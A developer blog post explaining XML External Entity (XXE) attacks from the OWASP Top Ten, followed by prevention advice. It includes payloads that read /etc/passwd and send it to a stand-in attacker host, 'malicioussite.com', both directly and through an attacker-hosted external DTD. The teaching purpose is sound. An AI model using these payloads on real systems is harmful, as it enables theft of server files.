---
layout: post
title: OWASP Top Ten - XML External Entities (XXE)
tags: tech
description: 
thumbnail: /4-xml-external-entities/thumbnail.jpg
thumbnail-creator-link: https://unsplash.com/@florianolv
thumbnail-creator: Florian Olivo
thumbnail-site: https://unsplash.com/
thumbnail-site-name: Unsplash
image-alt: Picture of SVG and HTML code
date: 2020-12-11
---

Anywhere you use XML *(eXtensible Markup Language)*, you have the potential for XXE *(XML eXternal Entity)* vulnerabilities.

Let's talk about where XML could exist in your app, what XXE is and why it's a risk for your application, and possible ways to prevent it.

<!--more-->

{% include toc.md %}

---

_All examples of potential attacks in this article are for demonstration and educational purposes only. They should never be used outside of a lab environment or to harm other computers, users, etc._

---

## Where XML Is That You Might Not Realize
Before studying XXE attacks, I didn't give a second thought to XML. I would venture a guess to say that most web developers don't think about it much.

But XML is in various parts of our application that we might not realize.

It's commonly used in API endpoints. SOAP uses it exclusively, but modern APIs using JSON could also accept XML as well.

**Did you know that .pdf, .docx, .xslx, and .svg files all contain XML?** If you accept uploads of any of these files in your application, you could be susceptible to an XXE attack.

Once you start looking, you'll find XML in places you didn't expect. **And anywhere there's XML, there's the potential for XXE**.

So what is XXE and why should we, as web developers, care about it?

---

## What Is XXE?
By now you know that XXE stands for XML eXternal Entities, but what is an entity?

In an XML document, **an entity is kind of like a variable**. You can declare a custom entity within the XML document and output it in an element, like this:
``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root [
	<!ELEMENT item ANY>
	<!ENTITY hello "Hello World">
]>
<item>&hello;</item>
```
Let's take this line by line.

1. The first line declares this an xml document, the version we're using, and how it's encoded.
2. The second line is called the DTD (Document Type Definition). This tells the parser what well-formed XML looks like for this document. In this line, we're also saying the root element of the document is 'root'.
3. The third line, while still in the DTD, is declaring one element, named 'item', that allows any combination of parsable data.
4. The fourth line, still in the DTD, is declaring one entity, named 'hello', that contains the text "Hello World".
5. The fifth line close the DTD.
6. The last line uses the `<item>` element and contains the `&hello;` entity.

The important part to understand here is that I've declared an entity. Anywhere it's displayed, the text "Hello World" will be output.

This functionality is what can be abused in XXE attacks.

For example, an attacker **could use this functionality to display the contents of local text files on the server**.

Let's pretend the XML file above is sent from a browser, to a server, over HTTP. It's unencrypted, so a MITM *(Monster-In-The-Middle)* could modify it to look something like this:
``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root [
	<!ELEMENT item ANY>
	<!ENTITY hello SYSTEM "file:///etc/passwd">
]>
<item>&hello;</item>
```
Only the 4th line has changed, but now wherever the `&hello;` entity is displayed *(such as on a page, in an error, or in a log)*, **it will now show the contents of /etc/passwd**. Instead of passing in text, an attacker has added the SYSTEM keyword telling the XML parser to read the contents of `/etc/passwd` on this system and output it to the `&hello;` entity.

As you might guess, this is not a good situation.

You might be thinking, what if we don't display that entity ANYWHERE. An attacker can't get the contents of `&hello;` so we're safe.

What if I told you **an attacker could modify the XML to send the contents of `&hello;` *(everything in `/etc/passwd`)* to a server they control**?

To do that, they could modify the XML to look something like this:
``` xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root [
	<!ELEMENT item ANY>
	<!ENTITY % hello SYSTEM "file:///etc/passwd">
	<!ENTITY sendtomysite SYSTEM "http://malicioussite.com/?%hello;">
]>
<item>&sendtomysite;</item>
```
Here, the attacker has modified the 4th line to include a % character before 'hello'. This tells the library that the entity will now be used within the DTD *(that's why on the 5th line you see `%hello;` instead of `&hello;`)*.

The 5th line has a new entity - **an external entity**. This line tells the parser that when `&sendtomysite;` is called, connect to `http://malicioussite.com` and attach the `%hello;` entity.

This means the `<item>` element doesn't have to be displayed anywhere. As long as it's processed, **the contents of `/etc/passwd` will be sent to `malicioussite.com` *(if external entities are enabled)***.

Yeah, that can suck. But maybe you only allow specifically formatted XML in your application or you block access to local files. If an attacker tried to inject into elements or directly read local server files, it wouldn't work.

Well, an attacker could try a different tactic - using **an external DTD**.

They'd need 2 files - the existing XML file *(like one inside a PDF or Word Doc)* and a second one controlled by the attacker.

The first file will be injected with the following code:
``` xml
<!DOCTYPE root [
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % dtd SYSTEM "http://malicioussite.com/ext.dtd">
	%dtd;
	%send;
]>
```
The second file, ext.dtd, lives on the attacker's server. It looks something like this:
``` xml
<!ENTITY send SYSTEM "http://malicioussite.com/?%file;">
```
Let's step through what will happen here.
1. First, everything is located within the DTD *(thus all entities are prefaced with % characters)*.
2. `%dtd;` will be parsed first. It will retrieve the ext.dtd file from `malicioussite.com`.
3. This inserts the `%send;` entity into the DTD (making it look similar to the previous example).
4. Next, the `%send;` entity gets parsed. This causes the %file to get retrieved *(containing the contents of `/etc/passwd`)* and sent along to `malicioussite.com`. 

This example isn't perfect. There's a decent chance an attacker would need to base64 encode the `/etc/passwd` first, but the idea is the same. **They're creating external entities and using them to exfiltrate server data**.

### Further Reading
- [More Examples of XXE attacks](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html#xml-entity-expansion){:target="_blank"}

---

## XXE Risks
XXE can be difficult to understand if you don't understand how XML works and how your library will parse it by default. Essentially, **XXE attacks abuse that default behavior to include external entities *(controlled by the attacker)* and gain access to server-side resources**.

At a minimum, **this access allows an attacker to view sensitive server information**. At its worst, **it could be used to eventually launch RCE *(Remote Code Execution)* attacks**, which is very, very bad.

### Further Reading
- [Learn More About XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing){:target="_blank"}
- [Testing for XML Injection *(can be used as an entry point to inject XXE)*](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection){:target="_blank"}

---

## Possible Ways To Help Prevent XXE
If you parse XML files in any way, and you aren't 100% certain about how your library does it, there is the potential for XXE vulnerabilities.

OWASP has [some good tips for prevention](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)){:target="_blank"}:
- Understand your XML library.
	- If needed, disable XML external entity and DTD processing.
	- Use the lastest XML libraries and keep them patched.
- Understand your endpoints.
	- Many APIs that use JSON will also allow XML. Since it's not expected, it's not always secured by default. Disable any alternative data formats.
- Use SAST tools to help find XXE vulnerabilities.

Like everything in security, this is a complex topic. **It can be difficult to fully understand and prevent it**.

Do your best, keep researching, and learn more to understand and help protect your application against this vulnerability.

#### Further Reading
- [How to Prevent XXE](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)){:target="_blank"}
- [OWASP's XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html){:target="_blank"}